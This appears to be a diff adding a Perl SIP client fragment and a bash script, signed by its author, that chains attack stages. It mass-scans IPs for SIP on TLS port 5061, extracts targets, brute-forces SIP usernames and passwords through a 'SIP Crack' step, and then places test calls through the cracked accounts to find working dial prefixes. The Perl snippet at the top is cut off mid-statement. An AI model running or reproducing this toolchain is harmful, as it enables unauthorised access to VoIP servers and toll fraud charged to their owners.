@@ -1,0 +1,74 @@
+my $ua = Net::SIP::Simple->new(
+outgoing_proxy => $ip,
+registrar => "sip:".$ip.";transport=tls",
+domain => $ip,
+from => $user,
+auth => [ $user,$pass ]
+=======================================================================
+
+#!/bin/bash
+
+# Scan TLS Port
+
+sudo cat ip.txt | docker run -i projectdiscovery/tlsx -p 5061 -san -cn -nc -v >> TLSxresult.txt
+
+echo -e "\nEnding Scan TLS !\n"
+
+# IP Extractor
+
+echo -e "\nStart IP Extractor ...\n"
+
+grep -Po "(\d+\.){3}\d+:?(\d?){7}" TLSxresult.txt >>cn1
+grep -E '\.[^.]+\.[[:alpha:]]' TLSxresult.txt > cnD
+sed '/:[0-9]*$/ ! s/$/:5061/' cnD >>cnDD
+cat cnDD cn1 >ccn
+grep -R ':' ccn >cn2
+awk '!a[$0]++' cn2 >IPS
+sleep 1
+sudo rm cn1
+sudo rm cn2
+sudo rm cnD
+sudo rm cnDD
+sudo rm ccn
+sleep 1
+
+echo -e "\nEnding IP Extractor !\n"
+
+# SIP responses
+
+echo -e "\nStart SIP responses ...\n"
+
+perl run IPS
+cat SSL.pal >> IPss
+sleep 1
+
+echo -e "\nEnding SIP responses !\n"
+
+# SIP Crack user&password
+
+echo -e "\nStart SIP Crack ...\n"
+
+perl Crack 1000 2 IPss
+sudo rm *.pal
+sleep 1
+
+echo -e "\nEnding SIP Crack !\n"
+
+# Prefix Testing Call
+
+echo -e "\nStart Prefix Testing ...\n"
+
+perl call VOIPresult 500 30 | tee callfile1
+grep -R 'MOHAMMAD' callfile1 >callfile2
+cat callfile2 | awk '{print $2,$3,$4,$5,$6}' > QWEASD.txt
+awk '!a[$0]++' QWEASD.txt >successCALL.txt
+sudo rm callfile1
+sudo rm callfile2
+sudo rm QWEASD.txt
+sudo rm IPSprog
+sleep 2
+
+echo -e "\nEnding Prefix Testing !\n"
+
+echo -e "\nby Mohammad Elnwajha\n"
+
